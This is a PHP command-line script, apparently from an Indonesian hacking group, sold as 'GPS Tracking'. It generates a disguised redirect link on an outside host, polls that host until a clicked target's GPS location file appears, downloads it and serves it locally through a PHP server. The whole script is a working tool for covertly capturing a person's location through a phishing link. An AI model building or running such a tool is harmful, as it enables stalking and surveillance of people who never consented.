<?php 

function tampil()
{
	echo "
 _____ ______  _____   _____              _    _             
|  __ \| ___ \/  ___| |_   _|            | |  (_)            
| |  \/| |_/ /\ `--.    | |_ __ __ _  ___| | ___ _ __   __ _ 
| | __ |  __/  `--. \   | | '__/ _` |/ __| |/ / | '_ \ / _` |
| |_\ \| |    /\__/ /   | | | | (_| | (__|   <| | | | | (_| |
 \____/\_|    \____/    \_/_|  \__,_|\___|_|\_\_|_| |_|\__, |
                                                        __/ |
                                                       |___/ 
    Author   : Brilly4n Gates => { IndoSec }
    Contact  : 085230516559 - timtam.rpl@gmail.com
    FansPage : https://www.facebook.com/IndoSecOfficial/
    Version  : 1.0.1
	";
}
$url = 'https://brad.josebernard.com/index/';
function proses($random)
{
	echo "\n\n[+] Created Link .... \n[+] ID Tracking : $random .... \n[+] Parameter => : ?page= ";
}

function buat_link($input, $random, $url)
{	
	$random2 = base64_encode($random);
	$url = 'Copy Link => '.$url.'home.php?redirect='.$input.'&page='.$random2;
	echo "\n\n[+] $url";
}

tampil();

$random = rand(123456789, 6);

proses($random);
$input = trim(fgets(STDIN));

buat_link($input, $random, $url);

// litening
echo "\n\n[+] Listening Target < ";
$a = 1;
for ($a; $a < 9999; $a++) { 
	// GPS_TRACK_21714075.html
	$cek = get_headers($url.'GPS_TRACK_'.$random.'.html');

	// listen
	if (!preg_match("/200/", $cek[0])) {
		echo "=";
	}else{
		echo " >\n\n[+] Target TERTYPU 200 OK";
		break;
	}
}

// download
echo "\n[+] Downloading ...";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url.'GPS_TRACK_'.$random.'.html');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, false);
$data = curl_exec($curl);
curl_close($curl);

touch('GPS_TRACK_'.$random.'.php');

$fp = fopen('GPS_TRACK_'.$random.'.php', 'w');
fwrite($fp, $data);
fclose($fp);

echo "\n[+] Membuka File...";
echo "\n\n[+] Buka Browser => : http://localhost:1999";

// run di localhost
system('php -S localhost:1999 GPS_TRACK_'.$random.'.php');

?>